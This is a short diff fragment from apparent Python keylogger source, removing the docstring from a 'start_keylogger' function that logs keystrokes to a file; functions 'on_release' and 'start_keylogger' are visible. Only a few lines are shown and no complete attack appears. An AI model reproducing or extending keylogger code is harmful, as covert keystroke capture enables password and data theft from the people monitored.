@@ -27,9 +27,6 @@ def on_release(key):
         return False
 
 def start_keylogger(log_file):
-    """
-    Start the keylogger
-    """
     logging.basicConfig(
         filename=log_file,
         level=logging.DEBUG,
